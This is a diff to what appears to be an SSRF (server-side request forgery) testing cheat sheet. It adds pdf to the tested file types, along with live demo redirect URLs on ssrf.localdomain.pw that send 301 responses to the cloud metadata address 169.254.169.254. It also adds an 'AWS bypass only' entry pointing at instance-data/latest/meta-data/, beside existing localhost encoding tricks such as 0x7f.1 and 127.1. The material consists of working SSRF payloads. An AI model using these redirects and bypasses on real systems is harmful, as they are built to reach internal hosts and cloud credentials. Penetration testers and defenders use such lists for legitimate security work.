@@ -18,7 +18,7 @@
 ### htaccess - redirect test for various cases
 Status codes: 300, 301, 302, 303, 305, 307, 308
 
-Filetypes: jpg, json, csv, xml
+Filetypes: jpg, json, csv, xml, pdf
 #### Live demo:
 jpg 301 response without and with a valid response body:
 
@@ -62,6 +62,16 @@ xml 301 response without and with a valid response body:
 `https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml`
 
 `https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml`
+
+pdf 301 response without and with a valid response body:
+
+`https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf`
+
+`https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf`
+
+`https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf`
+
+`https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf`
 
 ***
 
@@ -284,6 +294,12 @@ https://hackerone.com/reports/215105
 0x7f.1 => 127.0.0.1
 
 127.1 => 127.0.0.1
+
+***
+
+### AWS bypass only
+
+http://instance-data/latest/meta-data/
 
 ***
 
